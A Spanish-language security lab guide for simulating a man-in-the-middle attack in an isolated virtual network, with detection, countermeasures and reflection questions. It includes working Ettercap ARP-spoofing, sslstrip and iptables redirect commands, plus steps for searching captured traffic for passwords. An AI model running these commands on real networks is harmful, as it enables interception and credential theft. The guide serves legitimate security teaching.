# LAB 02.3: SIMULACIÓN DE ATAQUE MITM

**Duración**: 30 minutos
**⚠️ SOLO EN ENTORNO CONTROLADO ⚠️**

---

## ⚠️ ADVERTENCIA LEGAL

```
Este laboratorio es SOLO para educación en red AISLADA.

NUNCA ejecutes estos ataques en:
- Redes de producción
- Redes sin autorización escrita
- Internet

Consecuencias legales:
- Fraude electrónico
- Multas hasta $250,000
- Prisión hasta 20 años

SOLO PARA LABORATORIO AUTORIZADO
```

---

## Arquitectura del Lab

```
[Atacante: Kali]    [Víctima: Ubuntu]    [Router]
   192.168.56.10       192.168.56.20      192.168.56.1
         │                   │                  │
         └───────────────────┴──────────────────┘
                    Red Host-Only
```

---

## Paso 1: Configurar VMs (10 min)

### VM 1: Atacante (Kali Linux)
```bash
# IP estática
sudo ip addr add 192.168.56.10/24 dev eth1
```

### VM 2: Víctima (Ubuntu)
```bash
# IP estática
sudo ip addr add 192.168.56.20/24 dev eth1
```

### Verificar conectividad

```bash
# Desde atacante
ping 192.168.56.20

# Desde víctima
ping 192.168.56.10
```

---

## Paso 2: ARP Spoofing con Ettercap (10 min)

### En Atacante (Kali)

```bash
# Instalar Ettercap
sudo apt install ettercap-text-only

# Habilitar IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Ejecutar ARP spoofing
sudo ettercap -T -M arp:remote /192.168.56.1// /192.168.56.20//
#                                ↑ Router      ↑ Víctima
```

**Ettercap ahora intercepta tráfico entre víctima y router**

---

## Paso 3: Capturar Tráfico (5 min)

### En terminal separado del atacante

```bash
# Capturar tráfico
sudo tcpdump -i eth1 -w mitm_capture.pcap

# O con Wireshark
sudo wireshark
```

### En Víctima

```bash
# Generar tráfico HTTP
curl http://neverssl.com

# Visitar sitio web
firefox http://testphp.vulnweb.com
```

### En Atacante

```
Observar tráfico pasando por tu máquina
```

---

## Paso 4: Detectar el Ataque (5 min)

### En Víctima: Detectar ARP Spoofing

```bash
# Instalar arpwatch
sudo apt install arpwatch

# Monitorear
sudo arpwatch -i eth1

# O revisar ARP table
arp -a

# Si hay duplicados → ATAQUE
```

### Síntomas de MitM

- Dos MACs con misma IP
- Latencia aumentada
- Certificados SSL warnings
- Conexiones interrumpidas

---

## Paso 5: Contramedidas (5 min)

### 1. Static ARP Entry

```bash
# En víctima
sudo arp -s 192.168.56.1 <MAC_REAL_ROUTER>

# Verificar
arp -a
```

### 2. Enable Port Security (en switch real)

```cisco
switchport port-security
switchport port-security mac-address sticky
```

### 3. Usar VPN

```bash
# Todo el tráfico cifrado
openvpn --config client.ovpn
```

### 4. HTTPS Everywhere

```
Instalar extensión HTTPS Everywhere en browser
```

---

## Análisis de Captura

### Abrir en Wireshark

```bash
wireshark mitm_capture.pcap
```

### Buscar información sensible

```
Filter: http.request.method == "POST"
Follow HTTP Stream
Buscar: password, user, login
```

**Demostración**: Por qué cifrado es crítico

---

## Limpieza

```bash
# Detener Ettercap
Ctrl+C

# Deshabilitar IP forwarding
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward

# En víctima: limpiar ARP cache
sudo ip -s -s neigh flush all
```

---

## Ejercicio Adicional: SSL Stripping

### Instalar sslstrip

```bash
sudo apt install sslstrip

# Redirigir tráfico HTTP
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

# Ejecutar sslstrip
sslstrip -l 8080

# Ejecutar Ettercap en paralelo
sudo ettercap -T -M arp:remote /192.168.56.1// /192.168.56.20//
```

**Efecto**: HTTPS → HTTP downgrade

**Mitigación**: HSTS

---

## Entregables

- [ ] Screenshot de ARP table mostrando ataque
- [ ] Captura de tráfico (.pcap)
- [ ] Documento explicando:
  - Cómo funciona ARP spoofing
  - Cómo detectar el ataque
  - 3 contramedidas efectivas
- [ ] Demo de SSL stripping (opcional)

---

## Preguntas de Reflexión

1. ¿Por qué ARP es vulnerable por diseño?
2. ¿HTTPS protege completamente contra MitM?
3. ¿Qué rol juega HSTS en prevenir SSL stripping?
4. ¿Cómo un switch con DAI previene este ataque?
5. ¿Es suficiente VPN como única defensa?

---

[⬅️ Anterior](../lab_02_tls/) | [🏠 Volver al Módulo](../../README.md)
